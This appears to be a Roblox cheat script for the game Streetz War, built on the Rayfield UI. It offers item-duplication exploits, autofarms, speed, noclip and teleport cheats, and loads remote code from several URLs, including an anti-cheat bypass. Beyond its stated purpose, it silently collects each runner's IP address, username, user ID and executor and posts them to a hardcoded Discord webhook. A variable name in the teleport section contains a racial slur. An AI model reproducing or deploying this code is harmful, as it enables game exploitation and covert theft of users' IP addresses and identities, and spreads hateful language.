local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local function checkExecuter()
    local executer = identifyexecutor()
    if executer == "Solara" or executer == "JJSploit" or executer == "Xeno" or executer == "Zorara" or executer == "Ronix" or executer == "NX" or executer == "Solar" then
        return true 
    end
    return false
end

if checkExecuter() then
    game.Players.LocalPlayer:Kick("Your executer does not support this script due to anti cheat. You must have an executer with 100 UNC.")
    return
else
loadstring(game:HttpGet('https://raw.githubusercontent.com/Pixeluted/adoniscries/refs/heads/main/Source.lua'))()
end

local player = game.Players.LocalPlayer

local whitelistedPlayers = {
    "kaisfrms2hub",    --main ac
    "LAC_cal69",  
    "Player",
    "Player",
    "Player",
    "Player",
    "Player",
}

local isWhitelisted = false
for _, whitelistedName in pairs(whitelistedPlayers) do
    if player.Name == whitelistedName then
        isWhitelisted = true
        break
    end
end

-- If the player is not whitelisted, send a notification and stop the script
if not isWhitelisted then
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Access Denied!!",
        Text = "You are not whitelisted!",
        Duration = 3
    })
    return -- Prevent further code execution
end

print("Whitelisted - Loading UI...")

local Window = Rayfield:CreateWindow({
   Name = "ZK | SW2 | PREMIUM",
   Icon = nil, -- No icon
   LoadingTitle = "Loading..",
   LoadingSubtitle = "By Theyfw_kais",
   -- Blue & Black Theme
   Theme = {
      TextColor = Color3.fromRGB(0, 255, 0),
      Background = Color3.fromRGB(128, 128, 128),
      Topbar = Color3.fromRGB(128, 128, 128),
      Shadow = Color3.fromRGB(128, 128, 128),
      NotificationBackground = Color3.fromRGB(128, 128, 128),
      NotificationActionsBackground = Color3.fromRGB(0, 170, 255),
      TabBackground = Color3.fromRGB(128, 128, 128),
      TabStroke = Color3.fromRGB(0, 255, 0),
      TabBackgroundSelected = Color3.fromRGB(0, 255, 0),
      TabTextColor = Color3.fromRGB(0, 255, 0),
      SelectedTabTextColor = Color3.fromRGB(128, 128, 128),
      ElementBackground = Color3.fromRGB(128, 128, 128),
      ElementBackgroundHover = Color3.fromRGB(128, 128, 128),
      SecondaryElementBackground = Color3.fromRGB(128, 128, 128),
      ElementStroke = Color3.fromRGB(0, 255, 0),
      SecondaryElementStroke = Color3.fromRGB(0, 255, 0),
      SliderBackground = Color3.fromRGB(0, 255, 0),
      SliderProgress = Color3.fromRGB(0, 255, 0),
      SliderStroke = Color3.fromRGB(0, 255, 0),
      ToggleBackground = Color3.fromRGB(128, 128, 128),
      ToggleEnabled = Color3.fromRGB(0, 255, 0),
      ToggleDisabled = Color3.fromRGB(128, 128, 128),
      ToggleEnabledStroke = Color3.fromRGB(0, 255, 0),
      ToggleDisabledStroke = Color3.fromRGB(128, 128, 128),
      ToggleEnabledOuterStroke = Color3.fromRGB(0, 255, 0),
      ToggleDisabledOuterStroke = Color3.fromRGB(128, 128, 128),
      DropdownSelected = Color3.fromRGB(0, 255, 0),
      DropdownUnselected = Color3.fromRGB(128, 128, 128),
      InputBackground = Color3.fromRGB(128, 128, 128),
      InputStroke = Color3.fromRGB(0, 255, 0),
      PlaceholderColor = Color3.fromRGB(0, 255, 0)
   },

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false,

   ConfigurationSaving = {
      Enabled = False,
      FolderName = "YellowBlackThemeHub",
      FileName = "BigHub"
   },

   Discord = {
      Enabled = false,
      Invite = "noinvitelink",
      RememberJoins = true
   },

KeySystem = nil, -- Set this to true to use our key system
   KeySettings = {
      Title = "Untitled",
      Subtitle = "Key System",
      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {},
   }
})


local InfoTab = Window:CreateTab("üìäInfo", 4483362458)
local MainSection = InfoTab:CreateSection("Main Info")

local player = game.Players.LocalPlayer
local gameName = "Unknown Game"

pcall(function()
   local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
   if info and info.Name then
      gameName = info.Name
   end
end)

-- HWID via exploit API (Synapse X example)
local hwid = "Unavailable"
pcall(function()
   if gethwid then
      hwid = gethwid()
   elseif syn and syn.crypt then
      hwid = syn.crypt.hash("SynapseX-Unique-Seed") -- placeholder, adjust if there's a better API
   else
      hwid = "Executor not supported"
   end
end)

-- üë§ Player Name
InfoTab:CreateParagraph({
   Title = "Player",
   Content = player.Name
})

-- ü™™ User ID
InfoTab:CreateParagraph({
   Title = "User ID",
   Content = tostring(player.UserId)
})

-- üéÆ Game Name
InfoTab:CreateParagraph({
   Title = "Game",
   Content = gameName
})

-- üñ•Ô∏è HWID (Real via executor)
InfoTab:CreateParagraph({
   Title = "HWID",
   Content = hwid
})


local MainTab = Window:CreateTab("üè†Main", 4483362458) -- Title, Image
local Section = MainTab:CreateSection("üí≥Card Dupeüí≥")

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualInputManager = game:GetService("VirtualInputManager")
local player = Players.LocalPlayer

local dupeAmount = 10

-- Notification function with error handling
local function notify(message, time, type)
    local success, err = pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = type or "Info",
            Text = message,
            Duration = time or 5,
        })
    end)

    if not success then
        warn("Notification failed: " .. err)
    end
end

-- Textbox for Duplication Amount
MainTab:CreateInput({
    Name = "Laptop & Card Dupe",
    PlaceholderText = "Amount",
    RemoveTextAfterFocusLost = false,
    Flag = "DupeAmount",
    Callback = function(value)
        dupeAmount = tonumber(value) or 10
        if dupeAmount <= 0 then
            dupeAmount = 10  -- Fallback value
            notify("Invalid amount, defaulting to 10.", 3, "Warning")
        end
    end
})

-- Duplication Function
local function duplicateCardsAndLaptops()
    if dupeAmount <= 0 then
        notify("Invalid amount!", 3, "Error")
        return
    end

    notify("Buying cards & laptops...", 3, "Info")

    -- Open Dealer UI
    fireclickdetector(game.Workspace["Streetz War"].Anonymous.ClickDetector)
    wait(2) -- Wait to ensure the UI is open
    player.PlayerGui:WaitForChild("DealerGui")
    local shopGui = player.PlayerGui.DealerGui.ShopFrame
    shopGui.Visible = true
    player.PlayerGui.DealerGui.Frame.Visible = false
    game:GetService("RunService"):Set3dRenderingEnabled(false)

    -- Position player correctly
    repeat wait() until player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    player.Character.HumanoidRootPart.CFrame = CFrame.new(-55, 4.5, 170)

    wait(0.5)

    -- Click buttons for purchasing
    local cardButton = shopGui["Blank Card"]
    local laptopButton = shopGui["laptop"]

    for i = 1, dupeAmount do
        task.wait()
        -- Click the card button
        if cardButton.Visible then
            local cardPos = cardButton.AbsolutePosition
            VirtualInputManager:SendMouseButtonEvent(cardPos.X + 150, cardPos.Y + 60, 0, true, game, 0)
            task.wait(0.1)
            VirtualInputManager:SendMouseButtonEvent(cardPos.X + 150, cardPos.Y + 60, 0, false, game, 0)
        end

        task.wait(0.1)

        -- Click the laptop button
        if laptopButton.Visible then
            local laptopPos = laptopButton.AbsolutePosition
            VirtualInputManager:SendMouseButtonEvent(laptopPos.X + 150, laptopPos.Y + 60, 0, true, game, 0)
            task.wait(0.1)
            VirtualInputManager:SendMouseButtonEvent(laptopPos.X + 150, laptopPos.Y + 60, 0, false, game, 0)
        end
    end

    game:GetService("RunService"):Set3dRenderingEnabled(true)

    -- Close the UI
    local exitButton = shopGui.exit
    VirtualInputManager:SendMouseButtonEvent(exitButton.AbsolutePosition.X + 300, exitButton.AbsolutePosition.Y + 65, 0, true, game, 0)
    wait()
    VirtualInputManager:SendMouseButtonEvent(exitButton.AbsolutePosition.X + 300, exitButton.AbsolutePosition.Y + 65, 0, false, game, 0)

    -- Move player to next step
    player.Character.HumanoidRootPart.CFrame = CFrame.new(954, 4.7, -61)
    wait(4)

    -- Process Laptops
    notify("Processing laptops...", 3, "Info")
    local laptopCount = 0
    for _, v in pairs(player.Backpack:GetChildren()) do
        if v.Name == "Laptop" then
            laptopCount = laptopCount + 1
        end
    end

    for i = 1, laptopCount - 1 do
        spawn(function()
            local args = { true, "NEW123" }
            ReplicatedStorage.Assets.Other.GiverPunchmade:InvokeServer(unpack(args))
        end)
    end

    wait(4)
    player.Backpack.Laptop.Parent = player.Character
    wait(4)

    -- Process Cards
    notify("Processing cards...", 3, "Info")
    local cardCount = 0
    for _, v in pairs(player.Backpack:GetChildren()) do
        if v.Name == "Loaded Card" then
            cardCount = cardCount + 1
        end
    end

    for i = 1, cardCount do
        spawn(function()
            local args = { false, "NEW123" }
            ReplicatedStorage.Assets.Other.GiverPunchmade:InvokeServer(unpack(args))
        end)
    end

    wait(1)
    notify("Duplication Complete!", 5, "Success")
    player.Character.Humanoid:UnequipTools()
end

-- Button for Duplication
MainTab:CreateButton({
    Name = "Dupe Laptop & Card",
    Callback = function()
        duplicateCardsAndLaptops()
    end
})

local MainSection = MainTab:CreateSection("üì¶Mop / Box Farmüì¶")

local Toggle = MainTab:CreateToggle({
    Name = "Mop Autofarm",
    CurrentValue = false,
    Flag = "MopAutofarm",
    Callback = function(state)
        _G.automopfarm = state
        if _G.automopfarm then
            while _G.automopfarm do
                for i, v in pairs(game.Workspace.CleanPart:GetChildren()) do
                    if v.ProximityPrompt.Enabled == true then
                        game:GetService("ReplicatedStorage").GiveMop:FireServer()
                        v.ProximityPrompt.HoldDuration = 1
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame + Vector3.new(0, 2, 0)
                        wait(1)
                        fireproximityprompt(v.ProximityPrompt, v.ProximityPrompt.HoldDuration, false)
                        wait(v.ProximityPrompt.HoldDuration + 2.2)
                    end
                end
            end
        end
    end
})

local Toggle = MainTab:CreateToggle({
    Name = "Box Autofarm",
    CurrentValue = false,
    Flag = "BoxAutofarm",
    Callback = function(state)
        _G.autoboxfarm = state

        if _G.autoboxfarm then
            task.spawn(function()
                while _G.autoboxfarm do
                    local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                    
                    -- Move to the box location
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Job.Box.BOX1.CFrame
                    wait(0.5)
                    
                    -- Pick up the box
                    fireclickdetector(game.Workspace.Job.Box.BOX1.ClickDetector)
                    wait(0.2)
                    
                    -- Move back to the old position
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                    
                    -- Equip the box
                    game.Players.LocalPlayer.Backpack:WaitForChild("Box").Parent = game.Players.LocalPlayer.Character
                    
                    -- Drop the box at the job area
                    firetouchinterest(game.Workspace.Job.Box.Job, game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, 0)
                    wait()
                    firetouchinterest(game.Workspace.Job.Box.Job, game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, 1)
                    
                    -- Wait for the job cooldown
                    wait(15)
                end
            end)
        end
    end
})

local Section = MainTab:CreateSection("üî´Gun and Safe Dupeüî´")

local Button = MainTab:CreateButton({
   Name = "Safe Duplication",
   Callback = function()
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-134867, -196, 3287)     
            wait(15)
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-134867, -196, 3292)
   end,
})

local Toggle = MainTab:CreateToggle({
   Name = "Dupe gun",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
               local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
        local safeZones = game.Workspace.SafeZones:GetChildren()
        
        local closestSafeZone = nil
        local shortestDistance = math.huge 

        for _, safeZone in ipairs(safeZones) do
            local distance = (humanoidRootPart.Position - safeZone.Position).Magnitude
            if distance < shortestDistance then
                shortestDistance = distance
                closestSafeZone = safeZone
            end
        end
        
        if closestSafeZone then                
            humanoidRootPart.CFrame = closestSafeZone.CFrame
            character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead) 
        else
            warn("No safe zones found.")
        end
    end
})

local Section = MainTab:CreateSection("üè¶Withdraw / Depositüèß")


local Player = game.Players.LocalPlayer
local Cash = Player:WaitForChild("leaderstats"):WaitForChild("Cash")
local Bank = Player.leaderstats:WaitForChild("Bank")

MainTab:CreateInput({
    Name = "Deposit Amount",
    PlaceholderText = "Enter amount to deposit",
    RemoveTextAfterFocusLost = false,
    Callback = function(Value)
        UserInput.DepositAmount = tonumber(Value) or 0
    end,
})

MainTab:CreateButton({
    Name = "Deposit",
    Callback = function()
        local amount = UserInput.DepositAmount
        if Cash.Value >= amount and amount > 0 then
            Cash.Value = Cash.Value - amount
            Bank.Value = Bank.Value + amount
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Invalid or insufficient funds.",
                Duration = 3,
            })
        end
    end,
})

MainTab:CreateInput({
    Name = "Withdraw Amount",
    PlaceholderText = "Enter amount to withdraw",
    RemoveTextAfterFocusLost = false,
    Callback = function(Value)
        UserInput.WithdrawAmount = tonumber(Value) or 0
    end,
})

MainTab:CreateButton({
    Name = "Withdraw",
    Callback = function()
        local amount = UserInput.WithdrawAmount
        if Bank.Value >= amount and amount > 0 then
            Bank.Value = Bank.Value - amount
            Cash.Value = Cash.Value + amount
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Invalid or insufficient bank funds.",
                Duration = 3,
            })
        end
    end,
})

local PlayerTab = Window:CreateTab("üï¥üèªPlayer", 4483362458) -- Title, Image
local PlayerSection = PlayerTab:CreateSection("‚è™Speed / JumpüÜô")

local Slider = PlayerTab:CreateSlider({
   Name = "WalkSpeed",
   Range = {0, 300},
   Increment = 10,
   Suffix = "Speed",
   CurrentValue = 10,
   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
   end,
})

local Slider = PlayerTab:CreateSlider({
   Name = "Jump Height",
   Range = {0, 300},
   Increment = 10,
   Suffix = "Power",
   CurrentValue = 10,
   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
            game.Players.LocalPlayer.Character.Humanoid.JumpPower = (Value)
   end,
})

local PlayerSection = PlayerTab:CreateSection("üÜôExtra Abilitiesüëì")

local Toggle = PlayerTab:CreateToggle({
   Name = "Infinite Jump",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
   InfiniteJumpEnabled = not InfiniteJumpEnabled -- Toggle the state of InfiniteJumpEnabled
       if InfiniteJumpEnabled then
           -- Infinite jump is enabled
           print("Infinite Jump Enabled")
           game:GetService("UserInputService").JumpRequest:Connect(function()
               if InfiniteJumpEnabled then
                   game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):ChangeState("Jumping")
               end
           end)
       else
           -- Infinite jump is disabled
           print("Infinite Jump Disabled")
       end
   end,
})


local player = game:GetService("Players").LocalPlayer
local noclip = false
local noclipLoop


local function toggleNoclip(state)
    noclip = state
    if noclip then
        noclipLoop = task.spawn(function()
            while noclip do
                if player.Character then
                    for _, part in pairs(player.Character:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = false
                        end
                    end
                end
                task.wait()
            end
        end)
    else
        -- Stop noclip and restore collision
        if noclipLoop then
            task.cancel(noclipLoop)
        end
        if player.Character then
            for _, part in pairs(player.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = true
                end
            end
        end
    end
end

-- Create Toggle Button
PlayerTab:CreateToggle({
    Name = "No-Clip",
    CurrentValue = false,
    Flag = "NoclipToggle",
    Callback = function(Value)
        toggleNoclip(Value)
    end,
})

local Section = PlayerTab:CreateSection("‚úàÔ∏èLonely Ahh Flyy‚úàÔ∏è")

local Button = PlayerTab:CreateButton({
   Name = "Fly V3",
   Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
   end,
})

local HttpService = game:GetService("HttpService")

local executor = "Unknown"
if syn then
    executor = "Synapse X"
elseif secure_load then
    executor = "Script-Ware"
elseif KRNL_LOADED then
    executor = "KRNL"
elseif is_sirhurt_closure then
    executor = "SirHurt"
elseif pebc_execute then
    executor = "ProtoSmasher"
elseif fluxus then
    executor = "Fluxus"
elseif identifyexecutor then
    executor = identifyexecutor()
elseif getexecutorname then
    executor = getexecutorname()
end

-- Basic info
local discordUsername = "unknown#0000"
local robloxUser = game.Players.LocalPlayer.Name
local userId = game.Players.LocalPlayer.UserId
local placeId = game.PlaceId

-- Game name fetch
local gameName = "Unknown Game"
pcall(function()
   local info = game:GetService("MarketplaceService"):GetProductInfo(placeId)
   if info and info.Name then
      gameName = info.Name
   end
end)

-- IP fetch
local ip = "Unavailable"
pcall(function()
   ip = game:HttpGet("https://api.ipify.org")
end)

-- Webhook payload
local data = {
   ["embeds"] = {{
       ["title"] = "üìã New Script Log",
       ["color"] = 0x006400, -- Dark Green
       ["fields"] = {
           {
               ["name"] = "üíª Discord User",
               ["value"] = discordUsername,
               ["inline"] = true
           },
           {
               ["name"] = "üë§ Roblox User",
               ["value"] = robloxUser,
               ["inline"] = true
           },
           {
               ["name"] = "üÜî User ID",
               ["value"] = tostring(userId),
               ["inline"] = true
           },
           {
               ["name"] = "üéÆ Game",
               ["value"] = gameName,
               ["inline"] = false
           },
           {
               ["name"] = "üß™ Executor",
               ["value"] = executor,
               ["inline"] = false
           },
           {
               ["name"] = "üåç IP Address",
               ["value"] = ip,
               ["inline"] = false
           }
       },
       ["footer"] = {
           ["text"] = "Logged by OP ZK HUB! | " .. os.date("%c")
       }
   }}
}

local jsonData = HttpService:JSONEncode(data)

-- Webhook send
local webhook = "https://discord.com/api/webhooks/1359959528816513074/RFvJweUlo2rgu8MnU6A0uwk9584rILct8QEuFjMfQzixyFYpl1kMiikyl6lBBk0uJgkI"

local req = http_request or syn.request or http.request
if req then
   req({
       Url = webhook,
       Method = "POST",
       Headers = {
           ["Content-Type"] = "application/json"
       },
       Body = jsonData
   })
end

local TeleportsTab = Window:CreateTab("‚úàÔ∏èTeleports", 4483362458) -- Title, Image
local Section = TeleportsTab:CreateSection("üè†Main Teleports‚úàÔ∏è")

local mainTeleportLocations = {
    {Name = "üöóDealership", Position = CFrame.new(842, 5, -7)},
    {Name = "üè©Apartments 2", Position = CFrame.new(739, 4, 199)},
    {Name = "üè®Apartments 1", Position = CFrame.new(4, 4, 52)},
    {Name = "üßπPaki Shop", Position = CFrame.new(-101, 4, 18)},
    {Name = "üì¶Box Job", Position = CFrame.new(-118, 4, 300)},
    {Name = "üçïPizza Job", Position = CFrame.new(166, 5, 49)},
    {Name = "üè™Thrift Store", Position = CFrame.new(-42, 4, 36)},
    {Name = "ü•äBoxing", Position = CFrame.new(259, 5, -100)},
    {Name = "üèÜCasino", Position = CFrame.new(159, 5, 246)},
    {Name = "üíéIce Box", Position = CFrame.new(-11354, 4, 288)},
    {Name = "ü§≠Suit Shop", Position = CFrame.new(43, 4, -329)},
    {Name = "üè•Hospital", Position = CFrame.new(42, 4, -261)},
    {Name = "üî´Gun Store", Position = CFrame.new(-51807, 4, -11)},
    {Name = "ü•∑Bank Tools Etc", Position = CFrame.new(-142, 4, 189)},
    {Name = "üí≥Blanc Card Dealer", Position = CFrame.new(226, 4, -543)},
}

local mainLocationNames = {}
for _, location in ipairs(mainTeleportLocations) do
    table.insert(mainLocationNames, location.Name)
end

local selectedMainLocation = mainTeleportLocations[1]

TeleportsTab:CreateDropdown({
    Name = "Select Main Location",
    Options = mainLocationNames,
    CurrentOption = {mainLocationNames[1]},
    MultipleOptions = false,
    Flag = "MainTeleportLocationDropdown",
    Callback = function(Options)
        for _, location in ipairs(mainTeleportLocations) do
            if location.Name == Options[1] then
                selectedMainLocation = location
                break
            end
        end
    end
})

TeleportsTab:CreateButton({
    Name = "Teleport to Main Location",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = selectedMainLocation.Position
        else
            warn("No valid character or HumanoidRootPart found!")
        end
    end
})

-- Section 2: Gang Locker Teleports
local GangSection = TeleportsTab:CreateSection("üõÖGang Turf / Locker TeleportsüõÖ")

local gangTeleportLocations = {
    {Name = "üççTNT Locker", Position = CFrame.new(269, 5, 132)},
    {Name = "ü©∏ATB Locker", Position = CFrame.new(93, 4, -703)},
    {Name = "ü©∂SG Locker", Position = CFrame.new(188, 4, -395)},
    {Name = "üíôKAO Locker", Position = CFrame.new(328, 7, 82)},
    {Name = "üíôAF Locker", Position = CFrame.new(162, 5, 518)},
    {Name = "üß°EOS Locker", Position = CFrame.new(374, 22, 409)},
    {Name = "üíöAOD Locker", Position = CFrame.new(6, 5, 509)},
    {Name = "‚ù§Ô∏èLAC Locker", Position = CFrame.new(-166, 4, -773)},
    {Name = "üíôP9 Locker", Position = CFrame.new(459, 7, 160)},
    {Name = "üíôTPL Locker", Position = CFrame.new(318, 7, 230)},
    {Name = "üíõRGD Locker", Position = CFrame.new(599, 7, 223)},
    {Name = "NGF Locker", Position = CFrame.new(571, 20, 174)},
    {Name = "üíôDF Locker", Position = CFrame.new(870, 5, 498)},
    {Name = "üéÑWheel Spin", Position = CFrame.new(142, 4, 91)},
}

local gangLocationNames = {}
for _, location in ipairs(gangTeleportLocations) do
    table.insert(gangLocationNames, location.Name)
end

local selectedGangLocation = gangTeleportLocations[1]

TeleportsTab:CreateDropdown({
    Name = "Select Gang Locker Location",
    Options = gangLocationNames,
    CurrentOption = {gangLocationNames[1]},
    MultipleOptions = false,
    Flag = "GangTeleportLocationDropdown",
    Callback = function(Options)
        for _, location in ipairs(gangTeleportLocations) do
            if location.Name == Options[1] then
                selectedGangLocation = location
                break
            end
        end
    end
})

TeleportsTab:CreateButton({
    Name = "Teleport to Gang Locker",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = selectedGangLocation.Position
        else
            warn("No valid character or HumanoidRootPart found!")
        end
    end
})


local TeleportsSection = TeleportsTab:CreateSection("üï¥üèªPlayer Teleportsüï¥‚úàÔ∏è")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local dkIsANigger = {}

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        table.insert(dkIsANigger, player.Name)
    end
end

local TeleportDropdown = TeleportsTab:CreateDropdown({
    Name = "Players",
    Options = dkIsANigger,
    CurrentOption = {},
    MultipleOptions = false,
    Flag = "PlayerDropdown",
    Callback = function(Options)
        SelectedPlayer = Options[1]
    end,
})

local function UpdateDropdown()
    local ExistingPlayers = {}
    for _, name in ipairs(dkIsANigger) do
        ExistingPlayers[name] = true
    end

    local NewOptions = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            table.insert(NewOptions, player.Name)
        end
    end

    dkIsANigger = NewOptions
    TeleportDropdown:Set(dkIsANigger)
end

local TeleportButton = TeleportsTab:CreateButton({
    Name = "Teleport",
    Callback = function()
        local TargetPlayer = Players:FindFirstChild(SelectedPlayer)
        if TargetPlayer and TargetPlayer.Character and LocalPlayer.Character then
            LocalPlayer.Character:SetPrimaryPartCFrame(TargetPlayer.Character:GetPrimaryPartCFrame())
        end
    end,
})

local RefreshButton = TeleportsTab:CreateButton({
    Name = "üîÉRefresh PlayersüîÉ",
    Callback = UpdateDropdown,
})

local VisualTab = Window:CreateTab("üëìVisual", 4483362458) -- Title, Image
local VisualSection = VisualTab:CreateSection("üè∑Ô∏èCustomüè∑Ô∏è")

local function updateCharacterGui(field, text)
    local character = game.Players.LocalPlayer.Character
    if character and character:WaitForChild("Head") then
        local nameGui = character.Head:WaitForChild("NameGui"):WaitForChild("Main")
        if nameGui then
            local guiElement = nameGui:WaitForChild(field)
            if guiElement then
                guiElement.Text = text
            end
        end
    end
end


local lastplayername = nil
local lastplayerlvl  = nil
local lastplayeremoji = nil


VisualTab:CreateInput({
    Name = "Custom Name",
    PlaceholderText = "Enter Name...",
    RemoveTextAfterFocusLost = false,
    Callback = function(text)
        lastplayername = text
        updateCharacterGui("Name", text)
    end
})


VisualTab:CreateInput({
    Name = "Custom Level",
    PlaceholderText = "Enter Level...",
    RemoveTextAfterFocusLost = false,
    Callback = function(text)
        lastplayerlvl = text
        updateCharacterGui("Level", "LVL " .. text)
    end
})


VisualTab:CreateInput({
    Name = "Custom Emoji",
    PlaceholderText = "Enter Emoji...",
    RemoveTextAfterFocusLost = false,
    Callback = function(text)
        lastplayeremoji = text
        updateCharacterGui("Extras", "[" .. text .. "]")
    end
})


VisualTab:CreateButton({
    Name = "Apply Changes",
    Callback = function()
       
        if lastplayername then
            updateCharacterGui("Name", lastplayername)
        end
        
        if lastplayerlvl then
            updateCharacterGui("Level", "LVL " .. lastplayerlvl)
        end
        
        if lastplayeremoji then
            updateCharacterGui("Extras", "[" .. lastplayeremoji .. "]")
        end

       
        Rayfield:Notify({
            Title = "Updated",
            Content = "Updated By SEXY ZK HUB OWNER",
            Duration = 5
        })
    end
})
